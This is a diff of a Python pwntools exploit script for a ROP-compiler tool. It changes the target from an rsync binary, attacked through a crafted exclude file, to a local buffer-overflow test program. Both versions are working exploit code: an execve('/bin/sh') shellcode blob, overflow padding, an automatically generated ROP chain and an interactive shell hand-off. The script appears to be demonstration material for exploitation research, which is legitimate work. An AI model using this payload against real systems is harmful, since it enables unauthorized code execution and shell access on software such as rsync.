@@ -1,10 +1,14 @@
-import sys, logging, binascii
-import archinfo
+import sys, logging
 from pwn import *
-from rop_compiler import ropme, goal
+from rop_compiler import ropme
 
-filename = './example/rsync'
-files = [(filename, './example/rsync.gadgets', 0)]
+filename = './bof_syscall'
+p = process([filename,'3000'])
+#gdb.attach(p, "set disassembly-flavor intel\nbreak *0x40063f\nbreak *0x400641\nbreak *0x400643")
+
+line = p.readline()
+buffer_address = int(line.split(":")[1],16)
+
 shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
     "\x48\x31\xd2"                                  # xor    %rdx, %rdx
  +  "\x48\x31\xc0"                                  # xor    %rax, %rax
@@ -18,18 +22,16 @@ shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
  +  "\xb0\x3b"                                      # mov    $0x3b, %al
  +  "\x0f\x05"                                      # syscall
 )
+target_address = buffer_address + 1024
+print "shellcode ({} bytes) address: 0x{:x}".format(len(shellcode), target_address)
 
-print "Finding gadgets and generating rop chain"
-goals = [["shellcode_hex", binascii.hexlify(shellcode)]]
-rop = ropme.rop(files, ["/lib/x86_64-linux-gnu/libc.so.6"], goals, archinfo.ArchAMD64(), logging.DEBUG)
+rop = ropme.rop_to_shellcode([(filename, None, 0)], [], target_address)
 
-payload = ("A" * 5696) + "J"*8 + rop
+payload = 'A'*512 + 'B'*8 + rop
+payload += ((1024 - len(payload)) * 'B') + shellcode
 
 with open("/tmp/rop", "w") as f: f.write(rop)
 with open("/tmp/payload", "w") as f: f.write(payload)
 
-print "Starting rsync with the exploit payload"
-p = process(argv = [filename, '-r', '--exclude-from=/tmp/payload', '.', '/tmp/to/'], executable = filename)
-#gdb.attach(p, "set disassembly-flavor intel\nbreak *mprotect\n")
-
+p.writeline(payload)
 p.interactive()
